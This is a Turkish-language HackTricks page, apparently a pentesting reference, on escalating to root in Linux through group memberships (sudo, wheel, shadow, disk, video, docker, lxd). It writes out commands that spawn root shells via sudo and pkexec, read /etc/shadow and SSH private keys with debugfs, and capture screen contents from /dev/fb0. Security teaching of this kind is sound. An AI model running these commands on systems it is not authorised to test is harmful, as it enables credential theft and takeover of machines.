<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hacklemeyi öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


# Sudo/Yönetici Grupları

## **PE - Yöntem 1**

**Bazen**, **varsayılan olarak \(veya bazı yazılımların ihtiyaç duyması nedeniyle\)** **/etc/sudoers** dosyasında aşağıdaki satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait olan herhangi bir kullanıcının sudo olarak herhangi bir şeyi çalıştırabileceği anlamına gelir**.

Eğer durum buysa, **root olmak için sadece şunu çalıştırabilirsiniz**:
```text
sudo su
```
## PE - Yöntem 2

Tüm suid ikili dosyalarını bulun ve **Pkexec** ikili dosyasının olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Eğer pkexec ikili bir SUID ikili dosyası olduğunu ve sudo veya admin grubuna ait olduğunuzu tespit ederseniz, muhtemelen pkexec kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz.
Aşağıdaki içeriği kontrol edin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Aşağıda, **pkexec**'i **çalıştırma izni olan grupları** ve bazı linux sistemlerinde **varsayılan olarak** **sudo veya admin** gruplarından bazılarının bulunabileceği belirtilmiştir.

**Root olmak için şunları çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec** komutunu çalıştırmaya çalışırsanız ve aşağıdaki **hata** ile karşılaşırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**İzinlerinizin olmaması değil, GUI olmadan bağlantı kurmamanızdır**. Ve bu sorun için bir çözüm yolu burada bulunmaktadır: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumu**'na ihtiyacınız vardır:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="oturum2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Grubu

**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyasının içinde bu satırı bulabilirsiniz:
```text
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo olarak herhangi bir şeyi çalıştırabileceği anlamına gelir**.

Eğer durum buysa, **root olmak için sadece şunu çalıştırabilirsiniz**:
```text
sudo su
```
# Shadow Grubu

**shadow** grubundaki kullanıcılar **/etc/shadow** dosyasını **okuyabilir**:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
# Disk Grubu

Bu ayrıcalık, makinenin içindeki tüm verilere erişebileceğiniz için neredeyse kök erişimiyle eşdeğerdir.

Dosyalar: `/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Not: debugfs kullanarak ayrıca **dosya yazabilirsiniz**. Örneğin, `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, `/etc/shadow` veya `/etc/passwd` gibi **root'a ait olan dosyalara yazmaya** çalışırsanız, "**İzin reddedildi**" hatası alırsınız.

# Video Grubu

`w` komutunu kullanarak **sisteme kimin oturum açtığını** bulabilirsiniz ve aşağıdaki gibi bir çıktı gösterecektir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, kullanıcının makinedeki bir terminalde fiziksel olarak oturum açtığı anlamına gelir.

**video grubu**, ekran çıktısını görüntüleme yetkisine sahiptir. Temel olarak ekranları gözlemleyebilirsiniz. Bunun için, ekranın mevcut görüntüsünü ham veri olarak yakalamanız ve ekranın kullandığı çözünürlüğü elde etmeniz gerekmektedir. Ekran verileri `/dev/fb0`'a kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` üzerinde bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Raw görüntüyü** açmak için **GIMP** kullanabilirsiniz, **`screen.raw`** dosyasını seçin ve dosya türü olarak **Ham görüntü verisi**ni seçin:

![](../../.gitbook/assets/image%20%28208%29.png)

Daha sonra genişlik ve yüksekliği ekranda kullanılan değerlere değiştirin ve farklı Görüntü Türlerini kontrol edin \(ve ekranı daha iyi gösteren birini seçin\):

![](../../.gitbook/assets/image%20%28295%29.png)

# Root Grubu

Varsayılan olarak, **root grubunun üyeleri** bazı **hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını veya **diğer ilginç şeyleri** değiştirebilme yetkisine sahip olabilir...

**Root grubunun üyelerinin değiştirebileceği dosyaları kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Grubu

Bir örneğin birimine ana makinenin kök dosya sistemini bağlayabilirsiniz, böylece örnek başladığında bu birime bir `chroot` yüklenir. Bu size etkili bir şekilde makinede kök erişimi sağlar.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Grubu

[lxc - Privilege Escalation](lxd-privilege-escalation.md)



<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>
